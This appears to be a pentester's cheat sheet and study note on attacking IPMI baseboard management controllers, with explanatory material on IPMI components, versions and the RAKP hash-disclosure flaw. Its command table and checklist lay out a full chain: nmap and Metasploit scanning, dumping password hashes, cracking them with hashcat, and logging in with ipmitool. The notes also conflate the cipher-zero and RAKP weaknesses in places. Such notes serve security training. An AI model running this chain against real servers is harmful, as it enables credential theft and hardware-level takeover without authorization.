# Cheat Sheet 


| Command                                                                   | Description                                                                                                           |
| ------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| sudo nmap -sU --script ipmi-version -p 623 \<target>                      | use NSE to get version of the service                                                                                 |
| nmap -sU -p623 --script ipmi-cipher-zero target                           | scan by a nmap script, used to detect an authentication bypass vulnerability in (IPMI) v2.0 devices                   |
| use auxiliary/scanner/ipmi/ipmi_version                                   | payload in metasploit to get the version                                                                              |
| use auxiliary/scanner/ipmi/ipmi_dumphashes                                | payload in meta, used to IPMI dumphashes (for cipher zero vulnerability). Get hash_passwords if the target vulnerable |
| use auxiliary/scanner/ipmi/ipmi_cipher_zero                               | Scan the target to find servers running IPMI that are vulnerable to an authentication bypass (cipher-zero)            |
| hashcat -m 7300 --username ipmi_hashes.txt wordlist.txt                   | Crack hashes with hashcat, --username is for skip prefix in the hash format of ipmi                                   |
| ipmitool -I lanplus -H target -U admin -P cracked_password chassis status | Access system with cracked credentials                                                                                |

- [ ] Scan for port 623 UDP
- [ ] Scan or Check for Cipher-Zero (use metasploit or NSE)
- [ ] If the target is vulnerable (Cipher-zero), Then ipmi_dumphashes 
- [ ] Crack hashes you have got 
- [ ] try to login with creds you have cracked

try to get the version —> it is IPMI 2.0 (so Cipher-zero)? —> yes, then we can get the hash password and a user

# Related Articles

ipmi tool 
advanced enumeration : once you inside the service 
Real-World Scenario 
# Overview 

**Intelligent Platform Management Interface (IPMI)** is a hardware-level management standard used to monitor server health, control power, and manage physical computers remotely used for system management and monitoring. IPMI can be used to manage a server or network device before the OS is installed, during OS runtime, or even when the system is powered off. Think of it like a secret back door into the server hardware itself. A pentester loves IPMI because getting access to it is almost the same as having physical access to the machine.

**Key Characteristics:**

- **Port 623**: IPMI over UDP
- **Purpose**: Remote system management, monitoring, and control
- **Independence**: Functions independently of the main OS
- **Access**: Direct hardware-level access to systems
- **Authentication**: Username/password based with various privilege levels


### IPMI Components

1-**BMC (Baseboard Management Controller)**
Baseboard Management Controller. It is the small chip on the motherboard that runs IPMI. When you attack IPMI, you are attacking the BMC.
- **Function**: Microprocessor that monitors the server
- **Independence**: Operates independently of the main CPU and OS
- **Power**: Continuously powered (even when server is off)
- **Access**: Provides hardware access to system components
- **Communication**: Interfaces with various system sensors and components

2-**Management Console**
- **Purpose**: Interface for administrators to interact with IPMI
- **Access Methods**: Web interface, command-line tools, SNMP
- **Functionality**: System monitoring, power management, configuration
- **Remote Access**: Allows remote management of systems

3-**IPMI Protocol Stack**

|**Layer**|**Description**|
|---|---|
|**Application Layer**|Commands and responses|
|**Session Layer**|Authentication and session management|
|**Message Layer**|Message formatting and routing|
|**Transport Layer**|UDP/TCP communication|
we can say a steps for start IPMI : UDP connection --> define the format of packet --> auth & start a session --> perform commands and functions

### IPMI Version

|**Version**|**Authentication**|**Encryption**|**Security Features**|
|---|---|---|---|
|**IPMI 1.5**|MD5 hash|None|Basic authentication, no encryption|
|**IPMI 2.0**|HMAC-based|AES encryption|Enhanced authentication, encrypted sessions

**The RAKP flaw**(BUG) — this is the most important thing in this section. **IPMI 2.0** has a bug. When you try to log in, the server sends you the password hash BEFORE checking if you are a real user. This means you can get the hash of ANY valid user without knowing the password. Then crack it offline

### Authentication Types

- **None**: No authentication required
- **MD2**: MD2 hash-based authentication
- **MD5**: MD5 hash-based authentication
- **Straight Password**: Plain text password
- **OEM**: Vendor-specific authentication

.